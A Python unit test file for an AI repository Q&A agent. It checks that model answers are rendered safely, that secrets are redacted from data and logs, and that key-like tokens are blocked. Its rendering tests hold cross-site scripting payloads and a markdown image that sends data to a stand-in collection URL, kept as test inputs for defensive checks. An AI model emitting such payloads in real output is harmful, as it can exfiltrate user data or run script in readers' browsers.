import asyncio
from html.parser import HTMLParser
import io
import logging
from unittest.mock import patch
import unittest

from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart, ModelRequest, UserPromptPart
from pydantic_ai.models.function import FunctionModel

from agent import qa_agent, conversations
from agent.evidence import CheckedAnswer
from agent.tools import RepoDeps
from security.output import safe_answer_html, redact_text, redact_data, install_log_redaction
from security.sources import SourcePolicyError
from tests import test_history_tools as fixtures


class Tags(HTMLParser):
    def __init__(self, text):
        super().__init__()
        self.tags = []
        self.feed(text)
    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


class OutputPolicyTests(unittest.TestCase):
    def test_html_markdown_images_protocol_links_and_raw_html_cannot_act(self):
        payload = ('![preview](https://example.invalid/collect?data=FAKE_CANARY)\n'
                   '[normal](https://example.invalid/) [reference][x]\n\n'
                   '[x]: //example.invalid/\n\n'
                   '<img src="https://example.invalid/pixel" onerror="alert(1)">\n'
                   '<script>alert(1)</script>\n'
                   '[script](javascript&#58;alert(1))')
        rendered = safe_answer_html(payload)
        tags = Tags(rendered).tags
        self.assertFalse(any(tag in {"img", "a", "script", "iframe", "style", "object", "svg", "video", "audio"} for tag, _ in tags))
        self.assertTrue(all(not key.startswith("on") for _, attrs in tags for key in attrs))

    def test_only_exact_checked_github_source_urls_are_linked(self):
        good = "https://github.com/example/repo/blob/"+"a"*40+"/sample.py#L1-L2"
        other = good.replace("sample.py", "other.py")
        rendered = safe_answer_html(f"[S1]({good}) [S2]({other})", source_urls=[good, "javascript:alert(1)"])
        links = [attrs for tag, attrs in Tags(rendered).tags if tag == "a"]
        self.assertEqual(len(links), 1)
        self.assertEqual(links[0]["href"], good)
        self.assertEqual(links[0]["rel"], "noopener noreferrer")

    def test_code_lists_and_tables_remain_readable(self):
        rendered = safe_answer_html('## Title\n\n- item\n\n```python\nprint("<img src=x>")\n```\n\n|a|b|\n|-|-|\n|1|2|')
        tags = {tag for tag, _ in Tags(rendered).tags}
        self.assertTrue({"h2", "li", "pre", "code", "table"}.issubset(tags))
        self.assertNotIn("img", tags)

    def test_redaction_covers_nested_data_private_key_body_and_log_traceback(self):
        secret = "runtime-sensitive-canary"
        with patch("config.OPENAI_API_KEY", secret):
            self.assertNotIn(secret, str(redact_data({"value": [secret]})))
            private = "-----BEGIN "+"PRIVATE KEY-----\nFAKE_PRIVATE_BODY\n-----END "+"PRIVATE KEY-----"
            self.assertNotIn("FAKE_PRIVATE_BODY", redact_text(private))
            previous = logging.getLogRecordFactory()
            stream = io.StringIO()
            handler = logging.StreamHandler(stream)
            logger = logging.getLogger("security-output-fixture")
            logger.addHandler(handler)
            old_level = logger.level
            logger.setLevel(logging.ERROR)
            try:
                install_log_redaction()
                try:
                    raise ValueError(secret)
                except ValueError:
                    logger.exception("error: %s", secret)
            finally:
                logging.setLogRecordFactory(previous)
                logger.removeHandler(handler)
                logger.setLevel(old_level)
            self.assertNotIn(secret, stream.getvalue())
            self.assertIn("ValueError", stream.getvalue())
            self.assertIn("[REDACTED]", stream.getvalue())


class ModelDataBoundaryTests(unittest.TestCase):
    def setUp(self):
        self.helper = fixtures.HistoryToolTests()
        self.helper.setUp()
        self.addCleanup(self.helper.doCleanups)
        self.base = self.helper.helper

    def deps(self):
        return RepoDeps(fixtures.fixtures.URL, self.base.snapshot.root, fixtures.fixtures.COLLECTION,
                        self.base.sha, source_only=True)

    def test_secret_in_question_is_rejected_before_model_creation(self):
        with patch("agent.qa_agent._get_agent", side_effect=AssertionError("MODEL_MUST_NOT_RUN")):
            with self.assertRaises(SourcePolicyError):
                asyncio.run(qa_agent._run_answer("sk-"+"A"*32, self.deps(), self.base.session))
        self.assertEqual(self.base.load().revision, 0)

    def test_secret_in_model_output_is_not_saved_to_history_or_cache(self):
        token = "sk-"+"A"*32
        model = FunctionModel(lambda messages, info: ModelResponse(parts=[TextPart(token)]))
        with patch("agent.qa_agent.save_qa") as saved, self.assertRaises(SourcePolicyError):
            asyncio.run(qa_agent._run_answer("本地输出安全检查", self.deps(), self.base.session,
                                           agent=qa_agent.build_agent(model)))
        self.assertEqual(self.base.load().revision, 0)
        saved.assert_not_called()

    def test_secret_in_tool_arguments_is_not_emitted_to_observer(self):
        events = []
        model = FunctionModel(lambda messages, info: ModelResponse(parts=[ToolCallPart("search_code", {"query": "sk-"+"A"*32})]))
        deps = self.deps()
        with self.assertRaises(SourcePolicyError):
            asyncio.run(qa_agent._run_answer("本地工具安全检查", deps, self.base.session,
                agent=qa_agent.build_agent(model), on_event=events.append))
        self.assertEqual(events, [])
        self.assertEqual(deps.tool_events, [])
        self.assertEqual(self.base.load().revision, 0)

    def test_legacy_history_with_credentials_cannot_be_sent_back_to_model(self):
        state = self.base.load()
        token = "sk-"+"A"*32
        conversations.append_turn(state, "旧记录", [ModelRequest(parts=[UserPromptPart("旧记录")]),
            ModelResponse(parts=[TextPart(token)])], CheckedAnswer(text=token), 0)
        with patch("agent.qa_agent._get_agent", side_effect=AssertionError("MODEL_MUST_NOT_RUN")):
            with self.assertRaises(SourcePolicyError):
                asyncio.run(qa_agent._run_answer("继续", self.deps(), self.base.session))
        self.assertEqual(self.base.load().revision, 1)
